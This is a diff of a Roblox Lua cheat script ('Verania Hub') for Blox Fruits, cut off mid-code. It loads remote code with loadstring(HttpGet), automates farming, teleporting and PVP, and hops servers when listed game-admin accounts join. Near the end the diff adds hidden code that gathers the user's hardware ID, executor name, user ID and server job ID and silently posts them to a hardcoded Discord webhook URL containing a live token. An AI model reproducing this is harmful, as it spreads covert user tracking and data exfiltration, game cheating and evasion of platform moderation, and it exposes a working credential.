@@ -1322,32 +1322,36 @@ function AttackNoCoolDown()
         end
     end
 end
-print("--[[Loaded UI]]--")
-local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+
+Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
 Window = Fluent:CreateWindow({
     Title = "Verania Hub - Blox Fruits [ Version Beta Test ] by Arcesury",
     SubTitle = "Enum.KeyCode.LeftControl",
     TabWidth = 155,
     Size = UDim2.fromOffset(580, 300),
     Acrylic = false, 
-    Theme = "light",
+    Theme = "Light",
     MinimizeKey = Enum.KeyCode.LeftControl 
 })
-Info = Window:AddTab({ Title = "Tab Info", Icon = "" })
-Info:AddButton({
-    Title = "Discord",
-    Callback = function()
-        setclipboard("https://discord.gg/fmJGytRJ87")
-    end
-})
-Info:AddButton({
-    Title = "YouTube",
-    Callback = function()
-        setclipboard("https://www.youtube.com/@arcesury_ils")
-    end
-})
 
+-- Tabs
 Shop = Window:AddTab({ Title = "Tab Shop", Icon = "" })
+Server = Window:AddTab({ Title = "Tab Status And Server", Icon = "" })
+LGa = Window:AddTab({ Title = "Tab Local Player", Icon = "" })
+ChooseSkill = Window:AddTab({ Title = "Tab Setting Select Skill", Icon = "" })
+Settings = Window:AddTab({ Title = "Setting Farm", Icon = "" })
+Main = Window:AddTab({ Title = "Tab Farming", Icon = "" })
+Stack = Window:AddTab({ Title = "Tab Stack Farm", Icon = "" })
+Other = Window:AddTab({ Title = "Tab Farming Other", Icon = "" })
+Blog = Window:AddTab({ Title = "Tab Fruit And Raid", Icon = "" })
+Sea = Window:AddTab({ Title = "Tab Sea Event", Icon = "" })
+Race = Window:AddTab({ Title = "Tab Upgrade Race", Icon = "" })
+Get = Window:AddTab({ Title = "Tab Get Items And Buy", Icon = "" })
+Volcanic = Window:AddTab({ Title = "Tab Volcanic Event", Icon = "" })
+PVP = Window:AddTab({ Title = "Tab PVP", Icon = "" })
+ESP = Window:AddTab({ Title = "Tab ESP", Icon = "" })
+
+
 sex = {
     "WildDares",
     "BossBuild",
@@ -1426,7 +1430,7 @@ Shop:AddButton({
 })
 Shop:AddParagraph({
     Title = "Fighting Shop",
-    Content = "-----"
+    Content = string.rep("-", 21)
 })
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Remotes = ReplicatedStorage:WaitForChild("Remotes")
@@ -1549,45 +1553,45 @@ Shop:AddButton({
 })
 Shop:AddParagraph({
     Title = "Abilities Shop",
-    Content = "-----"
+    Content = string.rep("-", 21)
 })
 Shop:AddButton({
-	Title = "Skyjump [ $10,000 Beli ]",
+	Title = "Skyjump",
 	Callback = function()
 		game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki","Geppo")
 	end
 })
 Shop:AddButton({
-	Title = "Buso Haki [ $25,000 Beli ]",
+	Title = "Buso Haki",
 	Callback = function()
 		game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki","Buso")
 	end
 })
 Shop:AddButton({
-	Title = "Observation haki [ $750,000 Beli ]",
+	Title = "Observation haki",
 	Callback = function()
         game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("KenTalk","Buy")
 	end
 })
 Shop:AddButton({
-	Title = "Soru [ $100,000 Beli ]",
+	Title = "Soru",
 	Callback = function()
 		game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki","Soru")
 	end
 })
 Shop:AddParagraph({
     Title = "Misc Shop",
-    Content = "-----"
+    Content = string.rep("-", 21)
 })
 Shop:AddButton({
-     Title = "Buy Refund Stat (2500F)",
+     Title = "Buy Refund Stat",
      Callback = function()            
          game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","Refund","1")
          game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","Refund","2")
      end
 })
 Shop:AddButton({
-     Title = "Buy Reroll Race (3000F)",
+     Title = "Buy Reroll Race",
      Callback = function()            
          game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","Reroll","1")
 	     game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","Reroll","2")
@@ -1604,7 +1608,7 @@ Shop:AddButton({
     end
 })
 Shop:AddButton({
-    Title = "Buy Cyborg Race (2500F)",
+    Title = "Buy Cyborg Race",
     Callback = function()
         if not isBuying then
             isBuying = true
@@ -1615,59 +1619,8 @@ Shop:AddButton({
         end
     end
 })
-Server = Window:AddTab({ Title = "Tab Status And Server", Icon = "" })
-Time = Server:AddParagraph({
-    Title = "Time Zone",
-    Content = ""
-})
-function UpdateOS()
-    local date = os.date("*t")
-    local hour = (date.hour) % 24
-    local ampm = hour < 12 and "AM" or "PM"
-    local timezone = string.format("%02i:%02i:%02i %s", ((hour - 1) % 12) + 1, date.min, date.sec, ampm)
-    local datetime = string.format("%02d/%02d/%04d", date.day, date.month, date.year)    
-    local LocalizationService = game:GetService("LocalizationService")
-    local Players = game:GetService("Players")
-    local player = Players.LocalPlayer
-    local name = player.Name
-    local result, code    
-    if not getgenv().countryRegionCode then
-        result, code = pcall(function()
-            return LocalizationService:GetCountryRegionForPlayerAsync(player)
-        end)
-        if result then
-            getgenv().countryRegionCode = code
-        else
-            getgenv().countryRegionCode = "Unknown"
-        end
-    else
-        code = getgenv().countryRegionCode
-    end
-    Time:SetDesc(datetime.." - "..timezone.." [ " .. code .. " ]")
-end
-spawn(function()
-    while true do
-        UpdateOS()
-        wait(1)
-    end
-end)
-Timmessss = Server:AddParagraph({
-    Title = "Time",
-    Content = ""
-})
-function UpdateTime()
-    local GameTime = math.floor(workspace.DistributedGameTime + 0.5)
-    local Hour = math.floor(GameTime / (60^2)) % 24
-    local Minute = math.floor(GameTime / (60^1)) % 60
-    local Second = math.floor(GameTime / (60^0)) % 60
-    Timmessss:SetDesc(Hour.." Hour (h) "..Minute.." Minute (m) "..Second.." Second (s) ")
-end
-spawn(function()
-    while true do
-        UpdateTime()
-        wait(1)
-    end
-end)
+
+
 Miragecheck = Server:AddParagraph({
     Title = "Mirage Island",
     Content = "Status: "
@@ -1692,7 +1645,7 @@ Kitsunecheck = Server:AddParagraph({
 })
 spawn(function()
     local previousStatus = ""
-    while task.wait(1) do
+    while task.wait() do
         local currentStatus = game:GetService("Workspace").Map:FindFirstChild("KitsuneIsland") and '✅️' or '❌️'
         if currentStatus ~= previousStatus then
             Kitsunecheck:SetDesc('Status: ' .. currentStatus)
@@ -1706,7 +1659,7 @@ CPrehistoriccheck = Server:AddParagraph({
 })
 task.spawn(function()
     local previousStatus = ""
-    while task.wait(1) do
+    while task.wait() do
         local currentStatus = game.Workspace._WorldOrigin.Locations:FindFirstChild("Prehistoric Island") and '✅️' or '❌️'
         if currentStatus ~= previousStatus then
             CPrehistoriccheck:SetDesc("Status: " .. currentStatus)
@@ -1720,7 +1673,7 @@ FrozenIsland = Server:AddParagraph({
 })
 spawn(function()
     local previousStatus = ""
-    while wait(1) do
+    while wait() do
         local currentStatus = game.Workspace._WorldOrigin.Locations:FindFirstChild('Frozen Dimension') and '✅️' or '❌️'
         if currentStatus ~= previousStatus then
             FrozenIsland:SetDesc('Status: ' .. currentStatus)
@@ -1838,7 +1791,7 @@ end)
 Input = Server:AddInput("Input", {
      Title = "Input Job Id",
      Default = "",
-     Placeholder = "",
+     Placeholder = "Paste Job Id",
      Numeric = false,
      Finished = false,
      Callback = function(Value)
@@ -1963,7 +1916,7 @@ function Hop()
     end
     Teleport()
 end
-LGa = Window:AddTab({ Title = "Tab Local Player", Icon = "" })
+
 LGa:AddButton({
     Title = "Stop Tween",
     Callback = function()
@@ -1972,19 +1925,19 @@ LGa:AddButton({
 })
 LGa:AddButton({
 	Title = "Show Item",
-	Description = "",
+	Description = "I'm Still Fixing....",
 	Callback = function()	
 	end
 })
 LGa:AddButton({
     Title = "Open Devil Fruit Shop [ Mirage ]",
-    Description = "",
+    Description = "I'm Still Fixing....",
     Callback = function()     
     end
 })
 LGa:AddButton({
     Title = "Open Devil Fruit Shop",
-    Description = "",
+    Description = "I'm Still Fixing....",
     Callback = function()            
     end
 })
@@ -2424,7 +2377,7 @@ Toggle:OnChanged(function(Value)
         until not getgenv().TeleportIsland
     end
 end)
-Settings = Window:AddTab({ Title = "Setting Farm", Icon = "" })
+
 Dropdown = Settings:AddDropdown("DropdownFarm", {
     Title = "Select Weapon",
     Values = {"Melee","Sword","Blox Fruit"},
@@ -2659,11 +2612,11 @@ spawn(function()
     while wait() do
         if getgenv().SpinPos then
             Pos = CFrame.new(0, PosY, -20)
-            wait(0.1)
+            wait(0.15)
             Pos = CFrame.new(-20, PosY, 0)
-            wait(0.1)
+            wait(0.25)
             Pos = CFrame.new(0, PosY, 20)
-            wait(0.1)
+            wait(0.35)
             Pos = CFrame.new(20, PosY, 0)
         else
             Pos = CFrame.new(0, PosY, 0)
@@ -2732,18 +2685,62 @@ spawn(function()
         end)
     end
 end)
-Main = Window:AddTab({ Title = "Tab Farming", Icon = "" })
-Main:AddButton({
-    Title = "Copy discord invite link",
-    Callback = function()
-        pcall(function()
-            setclipboard("https://discord.gg/2YCGftRB")
-        end)
-    end
+
+Time = Main:AddParagraph({
+    Title = "Time Zone",
+    Content = ""
 })
+function UpdateOS()
+    local date = os.date("*t")
+    local hour = (date.hour) % 24
+    local ampm = hour < 12 and "AM" or "PM"
+    local timezone = string.format("%02i:%02i:%02i %s", ((hour - 1) % 12) + 1, date.min, date.sec, ampm)
+    local datetime = string.format("%02d/%02d/%04d", date.day, date.month, date.year)    
+    local LocalizationService = game:GetService("LocalizationService")
+    local Players = game:GetService("Players")
+    local player = Players.LocalPlayer
+    local name = player.Name
+    local result, code    
+    if not getgenv().countryRegionCode then
+        result, code = pcall(function()
+            return LocalizationService:GetCountryRegionForPlayerAsync(player)
+        end)
+        if result then
+            getgenv().countryRegionCode = code
+        else
+            getgenv().countryRegionCode = "Unknown"
+        end
+    else
+        code = getgenv().countryRegionCode
+    end
+    Time:SetDesc(datetime.." - "..timezone.." [ " .. code .. " ]")
+end
+spawn(function()
+    while true do
+        UpdateOS()
+        wait(1)
+    end
+end)
+Timmessss = Main:AddParagraph({
+    Title = "Time",
+    Content = ""
+})
+function UpdateTime()
+    local GameTime = math.floor(workspace.DistributedGameTime + 0.5)
+    local Hour = math.floor(GameTime / (60^2)) % 24
+    local Minute = math.floor(GameTime / (60^1)) % 60
+    local Second = math.floor(GameTime / (60^0)) % 60
+    Timmessss:SetDesc(Hour.." Hour (h) "..Minute.." Minute (m) "..Second.." Second (s) ")
+end
+spawn(function()
+    while true do
+        UpdateTime()
+        wait()
+    end
+end)
 Main:AddParagraph({
      Title = "Main Farm",
-     Content = "-----"
+     Content = string.rep("-", 21)
 })
 Dropdown = Main:AddDropdown("DropdownFarm", {
     Title = "Select Method Farm",
@@ -3008,7 +3005,7 @@ Toggle:OnChanged(function(Value)
 end)
 Main:AddParagraph({
      Title = "Farming Material",
-     Content = "-----"
+     Content = string.rep("-", 21)
 })
 local MaterialList = {}
 if World1 then
@@ -3081,7 +3078,7 @@ spawn(function()
 end)
 Main:AddParagraph({
      Title = "Mastery Farm",
-     Content = "-----"
+     Content = string.rep("-", 21)
 })
 Slider = Main:AddSlider("Slider", {
      Title = "Select Health [ % ]",
@@ -3413,27 +3410,7 @@ Toggle:OnChanged(function(Value)
     getgenv().MasteryFarm = Value
     StopTween(getgenv().MasteryFarm)
 end)
-Toggle = Main:AddToggle("Toggle", {Title = "Skill Z", Default = true })
-Toggle:OnChanged(function(Value)
-    getgenv().SkillZ = Value
-end)
-Toggle = Main:AddToggle("Toggle", {Title = "Skill X", Default = false })
-Toggle:OnChanged(function(Value)
-    getgenv().SkillX = Value
-end)
-Toggle = Main:AddToggle("Toggle", {Title = "Skill C", Default = false })
-Toggle:OnChanged(function(Value)
-    getgenv().SkillC = Value
-end)
-Toggle = Main:AddToggle("Toggle", {Title = "Skill V", Default = false })
-Toggle:OnChanged(function(Value)
-    getgenv().SkillV = Value
-end)
-Toggle = Main:AddToggle("Toggle", {Title = "Skill F", Default = false })
-Toggle:OnChanged(function(Value)
-    getgenv().SkillF = Value
-end)
-Stack = Window:AddTab({ Title = "Tab Stack Farm", Icon = "" })
+
 Dropdown = Stack:AddDropdown("DropdownFarm", {
     Title = "Select Melee",
     Values = {"Superhuman", "DeathStep", "Sharkman Karate", "Electric Claw", "Dragon Talon", "GodHuman"},
@@ -4309,7 +4286,7 @@ spawn(function()
         end
     end
 end)
-Other = Window:AddTab({ Title = "Tab Farming Other", Icon = "" })
+
 Other:AddParagraph({
         Title = "Quest Dragon",
         Content = ""
@@ -4451,7 +4428,7 @@ spawn(function()
 end)
 Other:AddParagraph({
         Title = "Farm Chest",
-        Content = "-----"
+        Content = string.rep("-", 21)
 })
 ToggleChest = Other:AddToggle("ToggleChest", {Title = "Auto Chest", Default = false })
 ToggleChest:OnChanged(function(Value)
@@ -4508,7 +4485,7 @@ spawn(function()
 end)
 Other:AddParagraph({
      Title = "Farm Observation",
-     Content = "-----"
+     Content = string.rep("-", 21)
 })
 ObservationRange = Other:AddParagraph({
     Title = "Observation Level",
@@ -4737,7 +4714,7 @@ spawn(function()
 end)
 Other:AddParagraph({
      Title = "Auto Boss",
-     Content = "-----"
+     Content = string.rep("-", 21)
 })
 if World1 then
     tableBoss = {
@@ -4894,7 +4871,7 @@ spawn(function()
         end
     end
 end)
-Blog = Window:AddTab({ Title = "Tab Fruit And Raid", Icon = "" })
+
 Toggle = Blog:AddToggle("Toggle", {Title = "Random Devil Fruit", Default = false })
 Toggle:OnChanged(function(Value)
     getgenv().RandomFruit = Value
@@ -5040,7 +5017,7 @@ spawn(function()
 end)
 Blog:AddParagraph({
     Title = "Raids",
-    Content = "-----"
+    Content = string.rep("-", 21)
 })
 Dropdown = Blog:AddDropdown("Dropdown", {
     Title = "Select Raid",
@@ -5198,7 +5175,7 @@ Blog:AddButton({
     end
 })
 end
-Sea = Window:AddTab({ Title = "Tab Sea Event", Icon = "" })
+
 SetSpeedBoatSlider = Sea:AddSlider("SliderSpeedBoat", {
 	Title = "Ship Speed",
 	Default = 300,
@@ -5928,7 +5905,7 @@ task.spawn(function()
 end)         
 Sea:AddParagraph({
         Title = "Kitsune Event",
-        Content = "-----"
+        Content = string.rep("-", 21)
     })    
 Toggle = Sea:AddToggle("Toggle", {Title = "Teleport To Kitsune Island",Default = false })
 Toggle:OnChanged(function(value)
@@ -6039,7 +6016,7 @@ Sea:AddButton({
 })
 Sea:AddParagraph({
         Title = "Leviathan Event",
-        Content = "-----"
+        Content = string.rep("-", 21)
     })
 Sea:AddButton({
     Title = "Buy Spy",
@@ -6099,10 +6076,10 @@ task.spawn(function()
         end
     end
 end)
-ChooseSkill = Window:AddTab({ Title = "Tab Setting Select Skill", Icon = "" })
+
 ChooseSkill:AddParagraph({
     Title = "Setting Sea Event",
-    Content = "-----"
+    Content = string.rep("-", 21)
 })
 ChooseSkill:AddParagraph({
     Title = "Activating Skill Event,\nAnd Skill Leviathan Flawless Fusion",
@@ -6140,7 +6117,7 @@ ChooseSkill:AddParagraph({
 })
 ChooseSkill:AddParagraph({
     Title = "Setting Skill Fruit",
-    Content = "-----"
+    Content = string.rep("-", 21)
 })
 Toggle = ChooseSkill:AddToggle("Toggle", {
     Title = "Skill Fruit Z",
@@ -6165,7 +6142,7 @@ Toggle:OnChanged(function(value)
 end)
 Toggle = ChooseSkill:AddToggle("Toggle", {
     Title = "Skill Fruit V",
-    Default = false
+    Default = true
 })
 Toggle:OnChanged(function(value)
     getgenv().SkillFruitV = value
@@ -6182,7 +6159,7 @@ ChooseSkill:AddParagraph({
 })
 ChooseSkill:AddParagraph({
     Title = "Setting Skill Melee",
-    Content = "-----"
+    Content = string.rep("-", 21)
 })
 Toggle = ChooseSkill:AddToggle("Toggle", {
     Title = "Skill Melee Z",
@@ -6210,7 +6187,7 @@ ChooseSkill:AddParagraph({
 })
 ChooseSkill:AddParagraph({
     Title = "Setting Skill Sword And Gun",
-    Content = "-----"
+    Content = string.rep("-", 21)
 })
 Toggle = ChooseSkill:AddToggle("Toggle", {
     Title = "Sword And Gun Skill Z",
@@ -6284,7 +6261,7 @@ task.spawn(function()
         end)
     end
 end)
-Volcanic = Window:AddTab({ Title = "Tab Volcanic Event", Icon = "" })
+
 Volcanic:AddButton({
 	Title = "Destroy Lava In Prehistoric Island",
 	Callback = function()
@@ -6511,7 +6488,7 @@ spawn(function()
 end)
 Volcanic:AddParagraph({
     Title = "Setting Skill Volcano Island",
-    Content = "-----"
+    Content = string.rep("-", 21)
 })
 Toggle = Volcanic:AddToggle("Toggle", {
     Title = "Auto Use Skill Melee",
@@ -6534,10 +6511,10 @@ Toggle = Volcanic:AddToggle("Toggle", {
 Toggle:OnChanged(function(v404)
     getgenv().UseGun = v404
 end)
-Race = Window:AddTab({ Title = "Tab Upgrade Race", Icon = "" })
+
 Race:AddParagraph({
     Title = "Race Draco",
-    Content = "-----"
+    Content = string.rep("-", 21)
 })
 local RunService = game:GetService("RunService")
 Toggle = Race:AddToggle("Toggle", {Title = "Teleport To The Draco Clan Trial Door", Default = false})
@@ -6562,7 +6539,7 @@ spawn(function()
 end)
 Race:AddParagraph({
     Title = "Race Normal",
-    Content = "-----"
+    Content = string.rep("-", 21)
 })
 Toggle = Race:AddToggle("Toggle", {Title = "Auto Upgrade Race V2", Default = false })
 Toggle:OnChanged(function(Value)
@@ -6712,7 +6689,7 @@ spawn(function()
 end)
 Race:AddParagraph({
     Title = "Race V4",
-    Content = "-----"
+    Content = string.rep("-", 21)
 })
 Toggle = Race:AddToggle("Toggle", {Title = "No Frog", Default = false})
 Toggle:OnChanged(function(Value)
@@ -7148,7 +7125,7 @@ spawn(function()
         end
     end
 end)
-Get = Window:AddTab({ Title = "Tab Get Items And Buy", Icon = "" })
+
 Toggle = Get:AddToggle("Toggle", {Title = "Auto Trade Bone", Default = false})
 Toggle:OnChanged(function(Value)
     getgenv().AutoTradeBone = Value
@@ -7420,9 +7397,9 @@ task.spawn(function()
                             EquipWeapon("Tushita")
                         elseif not hasNotified then
                             game.StarterGui:SetCore("SendNotification", {
-                                Title = "Hiru Hub",
+                                Title = "Verania Hub",
                                 Text = "Use! - Yama or Tushita",
-                                con = "rbxassetid://11995210995",
+                                con = "rbxassetid://82711721309764",
                                 Duration = 10,
                             })
                             hasNotified = true
@@ -7631,7 +7608,7 @@ spawn(function()
         end
     end
 end)
-ESP = Window:AddTab({ Title = "Tab ESP", Icon = "" })
+
 local RunService = game:GetService("RunService")
 local player = game:GetService("Players").LocalPlayer
 local IslandESP = false
@@ -7844,20 +7821,17 @@ Toggle:OnChanged(function(Value)
         end
     end
 end)
-PVP = Window:AddTab({ Title = "Tab PVP", Icon = "" })
-local Playerslist = {}
-for i, player in ipairs(game.Players:GetPlayers()) do
-    Playerslist[i] = player.Name
-end    
-Dropdown = PVP:AddDropdown("Dropdown", {
-     Title = "Select Player PVP",
-     Values = Playerslist,
-     Multi = false,
-     Default = false,
-})
-Dropdown:OnChanged(function(Value)
-   getgenv().SelectPlayer = Value
-end)
+Input = PVP:AddInput("Input", {
+     Title = "Input Player Name",
+     Default = "",
+     Placeholder = "Paste Name",
+     Numeric = false,
+     Finished = false,
+     Callback = function(Value)
+         getgenv().SelectPlayer = Value
+     end
+})    
+
 Toggle = PVP:AddToggle("MyToggle", {
     Title = "Teleport Player",
     Default = false
@@ -7879,58 +7853,7 @@ Toggle:OnChanged(function(Value)
         end)
     end
 end)
-Toggle = PVP:AddToggle("Toggle", {Title = "Auto Aimbot", Default = false })
-Toggle:OnChanged(function(Value)
-    getgenv().Aimbot = Value
-end)        
-spawn(function()
-    pcall(function()
-        while task.wait(0.1) do
-            if getgenv().Aimbot and getgenv().SelectPlayer then
-                local player = game.Players:FindFirstChild(getgenv().SelectPlayer)
-                local localPlayer = game.Players.LocalPlayer
-                local character = localPlayer.Character
-                local tool = character and character:FindFirstChildOfClass("Tool")
-                if player and player.Character and tool then
-                    local remoteEvent = tool:FindFirstChild("RemoteEvent")
-                    local mousePos = tool:FindFirstChild("MousePos")
-                    local target = player.Character:FindFirstChild("HumanoidRootPart")
-                    if remoteEvent and mousePos and target then
-                        remoteEvent:FireServer(target.Position)
-                    end
-                end
-            end
-        end
-    end)
-end)
-Toggle = PVP:AddToggle("Toggle", {Title = "Auto Aimbot Gun", Default = false })
-Toggle:OnChanged(function(Value)
-    getgenv().AimbotGun = Value
-end)        
-spawn(function()
-    while task.wait(0.1) do
-        if getgenv().AimbotGun and SelectWeaponGun then
-            local player = game:GetService("Players").LocalPlayer
-            local character = player and player.Character
-            local weapon = character and character:FindFirstChild(SelectWeaponGun)
-            local targetPlayer = game:GetService("Players"):FindFirstChild(getgenv().SelectPlayer)
-            local targetCharacter = targetPlayer and targetPlayer.Character
-            local targetHumanoidRootPart = targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart")
-            if weapon and targetHumanoidRootPart then
-                pcall(function()
-                    weapon.Cooldown.Value = 0
-                    local args = {
-                        [1] = targetHumanoidRootPart.Position,
-                        [2] = targetHumanoidRootPart
-                    }
-                    weapon.RemoteFunctionShoot:InvokeServer(unpack(args))
-                    local virtualUser = game:GetService("VirtualUser")
-                    virtualUser:Button1Down(Vector2.new(1280, 672))
-                end)
-            end
-        end
-    end
-end)
+
 Toggle = PVP:AddToggle("Toggle", {Title = "Safe Modes", Default = false })
 Toggle:OnChanged(function(Value)
     getgenv().SafeMode = Value
@@ -7993,7 +7916,7 @@ local Players = game:GetService("Players")
 local Player = Players.LocalPlayer
 getgenv().WalkSpeed = 16
 Toggle = PVP:AddToggle("Toggle", {
-    Title = "Change WalkSpeed",
+    Title = "Change Walk Speed",
     Default = false
 })
 local SpeedConnection
@@ -8034,7 +7957,7 @@ Toggle:OnChanged(function(Value)
     end
 end)
 Input = PVP:AddInput("Input", {
-     Title = "Input WalkSpeed",
+     Title = "Input Walk Speed",
      Default = 100,
      Placeholder = "Input",
      Numeric = true,
@@ -8044,74 +7967,45 @@ Input = PVP:AddInput("Input", {
      end
 })
 ----------------------------------------------------------------------------------------------------
-local MasteryHubBtn = Instance.new("ScreenGui")
-    local dutdit = Instance.new("Frame")
-    local UICorner = Instance.new("UICorner")
-    local ImageLabel = Instance.new("ImageLabel")
-    local TextButton = Instance.new("TextButton")
-
-    MasteryHubBtn.Name = "SHIN X HUB"
-    MasteryHubBtn.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-    MasteryHubBtn.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
-    dutdit.Name = "dut dit"
-    dutdit.Parent = MasteryHubBtn
-    dutdit.AnchorPoint = Vector2.new(0.1, 0.1)
-    dutdit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    dutdit.Position = UDim2.new(0, 20, 0.1, -6)
-    dutdit.Size = UDim2.new(0, 50, 0, 50)
-
-    UICorner.CornerRadius = UDim.new(1, 0)
-    UICorner.Parent = dutdit
-
-    ImageLabel.Parent = dutdit
-    ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
-    ImageLabel.BackgroundTransparency = 1.0
-    ImageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
-    ImageLabel.Size = UDim2.new(0, 40, 0, 40)
-    ImageLabel.Image = "rbxassetid://103292325021496"
-
-    TextButton.Parent = dutdit
-    TextButton.BackgroundTransparency = 1.0
-    TextButton.Size = UDim2.new(1, 0, 1, 0)
-    TextButton.Font = Enum.Font.SourceSans
-    TextButton.Text = ""
-    TextButton.TextColor3 = Color3.fromRGB(27, 42, 53)
-
-    local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local ContentProvider = game:GetService("ContentProvider")
+local playerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
+local existingGui = playerGui:FindFirstChild("CustomScreenGui")
+if existingGui then
+    existingGui:Destroy()
+end
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "CustomScreenGui"
+ScreenGui.Parent = playerGui
+local Button = Instance.new("ImageButton")
+Button.Name = "CustomButton"
+Button.Parent = ScreenGui
+Button.Size = UDim2.new(0, 50, 0, 50)
+Button.Position = UDim2.new(0.015, 0, 0.02, 20)
+Button.BackgroundTransparency = 1
+Button.Image = "rbxassetid://103292325021496"
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(1, 0)
+UICorner.Parent = Button
+local imageLoaded = false
+ContentProvider:PreloadAsync({Button.Image}, function()
+    imageLoaded = true
+end)
+Button.MouseButton1Click:Connect(function()
+    if not imageLoaded then
+        return
+    end
     local VirtualInputManager = game:GetService("VirtualInputManager")
-
-    local zoomedIn = false
-    local originalSize = UDim2.new(0, 40, 0, 40)
-    local zoomedSize = UDim2.new(0, 30, 0, 30)
-    local tweenInfo = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-
-    local faded = false
-    local fadeInTween = TweenService:Create(dutdit, tweenInfo, {BackgroundTransparency = 0.25})
-    local fadeOutTween = TweenService:Create(dutdit, tweenInfo, {BackgroundTransparency = 0})
-
-    TextButton.MouseButton1Down:Connect(
-        function()
-            if zoomedIn then
-                TweenService:Create(ImageLabel, tweenInfo, {Size = originalSize}):Play()
-            else
-                TweenService:Create(ImageLabel, tweenInfo, {Size = zoomedSize}):Play()
-            end
-            zoomedIn = not zoomedIn
-
-            if faded then
-                fadeOutTween:Play()
-            else
-                fadeInTween:Play()
-            end
-            faded = not faded
-
-            VirtualInputManager:SendKeyEvent(true, "LeftControl", false, game)
-        end
-    )
+    if VirtualInputManager then
+        task.defer(function()
+            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.LeftControl, false, game)
+            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.LeftControl, false, game)
+        end)
+    end
+end)
 --\\ ♡VIP♡
 ----------------------------------------------------------------------------------------------------
-print("--[[Hop Server If You Meet Game Admin]]--")
+
 local targetPlayers = {
     ["red_game43"] = true,
     ["rip_indra"] = true,
@@ -8129,7 +8023,7 @@ local targetPlayers = {
     ["TheGreateAced"] = true,
     ["rip_fud"] = true,
     ["drip_mama"] = true,
-    ["layandikit12"] = true,targetPlayers
+    ["layandikit12"] = true,
     ["Hingoi"] = true
 }
 spawn(function()
@@ -8142,4 +8036,118 @@ spawn(function()
             end
         end
     end
+end)
+local lastNotificationTime = 0
+local notificationCooldown = 10
+local currentTime = tick()
+if currentTime - lastNotificationTime >= notificationCooldown then
+    lastNotificationTime = currentTime
+end
+local Notify = FlurioreLib:MakeNotify({
+	["Title"] = "Verania Hub |",
+	["Description"] = "Free Scripts",
+	["Color"] = Color3.fromRGB(255, 0, 111),
+	["Content"] = "SCRIPT LOADING SUCCESS",
+	["Time"] = 1,
+	["Delay"] = 5
+})
+local placeId = game.PlaceId
+local jobId = game.JobId
+
+local sea1 = 2753915549
+local sea2 = 4442272183
+local sea3 = 7449423635
+
+local CheckWorld
+if placeId == sea1 then
+    World3 = "Sea 1"
+elseif placeId == sea2 then
+    World3 = "Sea 2"
+elseif placeId == sea3 then
+    World3 = "Sea 3"
+else
+    CheckWorld = "unknown sea"
+end
+
+local Players = game:GetService("Players")
+local playerCount = #game:GetService("Players"):GetPlayers()
+
+local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+local ExecutorUsing = identifyexecutor()
+local HttpService = game:GetService("HttpService")
+local Data =
+{
+    ["embeds"] = {
+        {
+            ["title"] = "Account About",
+            ["url"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId,
+            ["description"] = "```"..game.Players.LocalPlayer.DisplayName.." ```",
+            ["color"] = tonumber("0xff006f"),
+            ["thumbnail"] = {["url"] = ""},
+            ["fields"] = {
+                {
+                    ["name"] = "Execute:",
+                    ["value"] = "```"..ExecutorUsing.."```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Hwid:",
+                    ["value"] = hwid,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Sea:",
+                    ["value"] = "```" .. CheckSea.."```", 
+                    ["inline"] = true
+                },
+                {                
+                    ["name"] = "Job ID:",
+                    ["value"] = " " .. jobId,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Script Hop",
+                    ["value"] = "\n" .. 'game:GetService("TeleportService"):TeleportToPlaceInstance('..placeId..', "'..jobId..'", game.Players.LocalPlayer)' .. "\n", 
+                    ["inline"] = true 
+                },
+                {
+                    ["name"] = "Thanks Used Rise!",
+                    ["value"] = "**Verania Hub | Free Script Update 1**",
+                    ["inline"] = true          
+                }
+            }              
+        }
+    }
+}
+
+local Headers = {["Content-Type"] = "application/json"}
+local Encoded = HttpService:JSONEncode(Data)
+
+local Request = http_request or request or HttpPost or syn.request
+local Final = {Url = "https://discord.com/api/webhooks/1348104457925296129/1rlnix8w7p0LiDDWhIp8cs0OQ9K55J3lmL3ORXB8gddmzBG_3xIZT3EauOS_TXJ-Vdd4", Body = Encoded, Method = "POST", Headers = Headers}
+Request(Final)
+
+ChooseSkill:AddParagraph({
+    Title = "Activate Mastery Farm ",
+})
+
+Toggle = ChooseSkill:AddToggle("Toggle", {Title = "Skill Z", Default = true })
+Toggle:OnChanged(function(Value)
+    getgenv().SkillZ = Value
+end)
+Toggle = ChooseSkill:AddToggle("Toggle", {Title = "Skill X", Default = false })
+Toggle:OnChanged(function(Value)
+    getgenv().SkillX = Value
+end)
+Toggle = ChooseSkill:AddToggle("Toggle", {Title = "Skill C", Default = false })
+Toggle:OnChanged(function(Value)
+    getgenv().SkillC = Value
+end)
+Toggle = ChooseSkill:AddToggle("Toggle", {Title = "Skill V", Default = false })
+Toggle:OnChanged(function(Value)
